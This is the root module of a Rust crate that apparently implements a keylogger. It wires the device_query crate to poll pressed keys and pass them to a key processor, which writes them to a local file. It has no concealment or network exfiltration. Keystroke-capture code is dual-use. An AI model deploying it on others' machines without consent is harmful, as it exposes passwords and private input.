pub mod key_processor;
pub mod file_writer;
pub mod utils;

use device_query::{DeviceQuery, DeviceState};
use file_writer::FileWriter;
use key_processor::KeyProcessor;

pub struct KeyLogger {
    device_state: DeviceState,
    key_processor: KeyProcessor,
    file_writer: FileWriter,
}

impl KeyLogger {
    pub fn new(file_path: &str) -> Result<Self, std::io::Error> {
        let device_state = DeviceState::new();
        let key_processor = KeyProcessor::new();
        let file_writer = FileWriter::new(file_path)?;

        Ok(Self {
            device_state,
            key_processor,
            file_writer,
        })
    }

    pub fn process_keys(&mut self) {
        let keys = self.device_state.get_keys();
        self.key_processor.process(&keys, &mut self.file_writer);
    }

    pub fn should_exit(&self) -> bool {
        self.key_processor.should_exit()
    }
}